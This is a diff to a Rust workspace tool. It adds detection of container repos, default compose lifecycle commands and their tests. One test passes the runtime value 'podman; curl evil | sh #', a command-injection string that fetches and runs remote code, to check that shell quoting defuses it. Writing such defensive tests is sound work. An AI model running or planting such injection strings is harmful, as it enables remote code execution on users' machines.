@@ -288,6 +288,17 @@ impl WsConfig {
         self.repo_config(repo).map(RepoConfig::is_host).unwrap_or(false)
     }
 
+    /// Whether `repo`'s stack is a compose project: explicit `kind: container`,
+    /// else a compose file present in `worktree`. A bare-name repo is inferred the
+    /// same way. The single home for "does the compose default apply".
+    pub fn is_container_repo(&self, repo: &str, worktree: &Path) -> bool {
+        let has = || crate::compose::has_compose_file(worktree);
+        match self.repo_config(repo) {
+            Some(rc) => rc.is_container(has),
+            None => has(),
+        }
+    }
+
     /// The declarative lifecycle command for `(repo, event)`, if any: the repo's
     /// `scripts[event]` joined into one fail-fast shell command (`cmd1 && cmd2`).
     /// `None` for a bare-name repo, or one that declares no such event. The single
@@ -297,6 +308,15 @@ impl WsConfig {
         self.repo_config(repo)
             .and_then(|rc| rc.scripts.get(event))
             .map(|s| s.commands().join(" && "))
+    }
+
+    /// The command for `event`: the declared `scripts` entry, else the container
+    /// default (see [`default_script`]) when `is_container`. The bare-string
+    /// counterpart to [`crate::hooks::resolve`], for the paths that dispatch a
+    /// command rather than an `Action` (remote scripts over SSH, host supervision).
+    pub fn command_for(&self, repo: &str, event: &str, is_container: bool) -> Option<String> {
+        self.script_command(repo, event)
+            .or_else(|| is_container.then(|| default_script(self.runtime(), event)).flatten())
     }
 
     /// Whether per-worktree HTTP routing is in play: a `domain` is configured.
@@ -339,6 +359,31 @@ impl RepoEntry {
             RepoEntry::Extended(c) => &c.copy,
         }
     }
+}
+
+/// The compose command a **container** repo falls back to for a lifecycle event
+/// when it declares no script and has no legacy `.ws-hooks` file. `ws` already
+/// knows the runtime and injects `COMPOSE_FILE` + `COMPOSE_PROJECT_NAME`, so the
+/// obvious command needs no restating in every project's config.
+///
+/// `post-create` gets no default — there's no generic "set this project up" step.
+/// `post-remove` reaps the worktree's volumes: they're `ws`-namespaced artifacts
+/// (`COMPOSE_PROJECT_NAME=<branch>-<repo>`), so a plain `compose down` would orphan
+/// them, and recreating the branch later would silently reuse stale data. It runs
+/// at destroy time only (`ws rm` / `ws clean`) — never `ws down`, which must stay
+/// reversible.
+///
+/// `runtime` is `shell_quote`d: these run via `sh -c` and the value comes from a
+/// possibly-cloned `.ws.json` (same posture as `compose::remote_compose_script`).
+pub fn default_script(runtime: &str, event: &str) -> Option<String> {
+    let args = match event {
+        "up" => "compose up -d",
+        "down" => "compose down",
+        "status" => "compose ps -q | wc -l",
+        "post-remove" => "compose down -v",
+        _ => return None,
+    };
+    Some(format!("{} {args}", crate::remote::shell_quote(runtime)))
 }
 
 /// Load a workspace config from `<workspace-root>/.ws.json`.
@@ -506,6 +551,31 @@ fn read_json<T: for<'de> Deserialize<'de>>(p: &Path) -> Result<T> {
 
 #[cfg(test)]
 mod tests {
+    #[test]
+    fn container_defaults_cover_the_compose_lifecycle() {
+        assert_eq!(default_script("podman", "up").as_deref(), Some("podman compose up -d"));
+        assert_eq!(default_script("docker", "down").as_deref(), Some("docker compose down"));
+        assert_eq!(
+            default_script("podman", "status").as_deref(),
+            Some("podman compose ps -q | wc -l")
+        );
+        // Destroy-time only — reaps the worktree's ws-namespaced volumes.
+        assert_eq!(
+            default_script("podman", "post-remove").as_deref(),
+            Some("podman compose down -v")
+        );
+        // No generic "set this project up" step.
+        assert_eq!(default_script("podman", "post-create"), None);
+        assert_eq!(default_script("podman", "nonsense"), None);
+    }
+
+    #[test]
+    fn default_script_quotes_a_hostile_runtime() {
+        // `runtime` comes from a possibly-cloned `.ws.json` and these run via `sh -c`.
+        let s = default_script("podman; curl evil | sh #", "down").unwrap();
+        assert!(s.starts_with("'podman; curl evil | sh #' compose down"), "{s}");
+    }
+
     use super::*;
 
     fn write_cfg(dir: &Path, json: &str) {
